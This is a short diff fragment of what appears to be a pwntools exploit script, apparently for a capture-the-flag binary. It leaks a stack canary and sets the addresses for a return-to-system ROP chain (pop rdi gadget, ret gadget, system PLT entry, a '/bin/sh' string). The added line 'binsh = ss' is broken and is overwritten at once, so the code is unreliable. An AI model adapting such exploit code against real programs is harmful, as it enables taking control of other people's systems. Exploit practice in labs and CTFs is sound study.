@@ -10,6 +10,7 @@ p.recvuntil(payload)
 canary = u64(b'\x00'+p.recvn(7))
 
 system_plt = e.plt['system']
+binsh = ss
 binsh = 0x400874
 pop_rdi = 0x0000000000400853
 ret = 0x0000000000400285
